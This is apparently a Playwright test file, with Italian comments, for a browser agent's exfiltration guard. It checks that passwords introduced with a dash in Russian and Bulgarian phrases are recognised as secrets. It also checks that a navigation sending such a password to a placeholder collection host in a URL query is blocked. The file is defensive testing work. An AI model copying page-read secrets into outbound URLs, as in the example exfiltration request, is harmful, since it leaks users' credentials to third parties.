// #1403.8 giro 9: in russo, bulgaro e ucraino la password si presenta col trattino al posto del verbo («Мой пароль — qwerty123»).
// Il controllo di quello che un'azione porterebbe fuori e il registro dei letti devono riconoscerla come con i due punti.
import { test, expect } from '@playwright/test';
import { createRequire } from 'node:module';

const require = createRequire(import.meta.url);
for (const f of ['guardianoStatico.js', 'pavimento.js', 'campiSegreti.js', 'urlExfil.js']) require(`../../../src/shared/${f}`);
const G = globalThis.SN_GUARDIANO_STATICO;
const X = globalThis.SN_URL_EXFIL;

const FRASI = [
  ['Мой пароль — Kx82mPq9', 'Kx82mPq9'],
  ['Пароль – Gatto2024!', 'Gatto2024!'],
  ['пароль - Kx82mPq9', 'Kx82mPq9'],
  ['Паролата — Kx82mPq9', 'Kx82mPq9'],
];

test('r1 un\'azione che scrive la password presentata col trattino russo viene riconosciuta', () => {
  for (const [frase, valore] of FRASI) {
    expect(G.segretiInUscita(frase).map((x) => x.valore), frase).toContain(valore);
  }
});

test('r1 la password col trattino letta su una pagina e poi copiata in un indirizzo viene fermata', () => {
  for (const [frase, valore] of FRASI) {
    const v = X.valutaUscita({ type: 'NAVIGA', url: `https://raccolta.example/?d=${encodeURIComponent(valore)}` },
      { pagina: { testo: frase, host: 'forum.example' } });
    expect(v.blocca, frase).toBe(true);
  }
});
